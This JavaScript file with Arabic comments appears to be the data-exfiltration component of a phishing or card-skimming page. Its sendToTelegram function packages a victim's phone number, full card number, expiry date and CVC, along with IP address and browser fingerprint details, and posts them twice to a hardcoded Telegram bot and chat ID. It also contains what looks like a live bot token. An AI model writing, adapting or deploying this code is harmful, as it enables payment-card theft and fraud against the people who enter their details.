// إعدادات Telegram Bot
// ⚠️ مهم: استبدل هذه القيم بقيم البوت الخاص بك
const TELEGRAM_BOT_TOKEN = '8598568990:AAHdirQJ0hBr1xkJAfXoaNcDm3GWMXcqQKg'; // استبدل بتوكن البوت الخاص بك
const TELEGRAM_CHAT_ID = '7590246763'; // استبدل بمعرف الدردشة الخاص بك

// دالة إرسال البيانات إلى Telegram
async function sendToTelegram(userData) {
    try {
        // إنشاء نص الرسالة بشكل منظم
        const messageText = `
📋 *تم استلام بيانات جديدة*

👤 *المعلومات الشخصية:*
• 📱 رقم الهاتف: \`${userData.phone}\`
• 💳 رقم البطاقة: \`${userData.cardNumber}\`
• 📅 تاريخ الانتهاء: \`${userData.cardExpiry}\`
• 🔐 رمز الأمان (CVC): \`${userData.cardCVC}\`

🖥️ *معلومات الجهاز:*
• 🌐 المتصفح: ${userData.userAgent.substring(0, 50)}...
• 📺 دقة الشاشة: ${userData.screenResolution}
• 🕒 المنطقة الزمنية: ${userData.timezone}
• 📍 عنوان IP: \`${userData.ipAddress}\`
• 💬 اللغة: ${userData.language}
• 🖥️ النظام: ${userData.platform}
• 🔗 المرجع: ${userData.referrer}

⏰ *التاريخ والوقت:* ${userData.timestamp}
        `.trim();

        // إعداد بيانات الطلب
        const requestData = {
            chat_id: TELEGRAM_CHAT_ID,
            text: messageText,
            parse_mode: 'Markdown',
            disable_notification: false
        };

        // إرسال الطلب إلى Telegram API
        const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify(requestData)
        });

        // التحقق من استجابة API
        if (!response.ok) {
            const errorData = await response.json();
            console.error('خطأ من Telegram API:', errorData);
            throw new Error(`فشل إرسال الرسالة: ${errorData.description || 'خطأ غير معروف'}`);
        }

        // إرسال رسالة ثانية مع المزيد من التفاصيل
        const detailedMessage = `
📊 *تفاصيل إضافية:*

📱 *رقم الهاتف الكامل:* 
\`${userData.phone}\`

💳 *رقم البطاقة الكامل:* 
\`${userData.cardNumber}\`

🔐 *بيانات البطاقة الكاملة:*
• الرقم: \`${userData.cardNumber}\`
• الانتهاء: \`${userData.cardExpiry}\`
• CVC: \`${userData.cardCVC}\`

🌐 *معلومات المتصفح الكاملة:*
${userData.userAgent}

⏰ *الوقت الدقيق:* ${new Date().toISOString()}
        `.trim();

        // إرسال الرسالة الثانية
        await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                chat_id: TELEGRAM_CHAT_ID,
                text: detailedMessage,
                parse_mode: 'Markdown'
            })
        });

        return response;

    } catch (error) {
        console.error('خطأ في إرسال البيانات إلى Telegram:', error);
        throw error;
    }
}

// دالة لاختبار اتصال Telegram (اختياري)
async function testTelegramConnection() {
    try {
        const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/getMe`);
        const data = await response.json();
        
        if (data.ok) {
            console.log('✅ اتصال Telegram ناجح!');
            console.log(`اسم البوت: ${data.result.first_name}`);
            console.log(`اسم المستخدم: @${data.result.username}`);
            return true;
        } else {
            console.error('❌ فشل اتصال Telegram:', data.description);
            return false;
        }
    } catch (error) {
        console.error('❌ خطأ في اتصال Telegram:', error);
        return false;
    }
}

// اختبار الاتصال عند تحميل الصفحة (اختياري)
document.addEventListener('DOMContentLoaded', function() {
    // يمكنك تفعيل هذا السطر لاختبار الاتصال عند التحميل
    // testTelegramConnection();
});
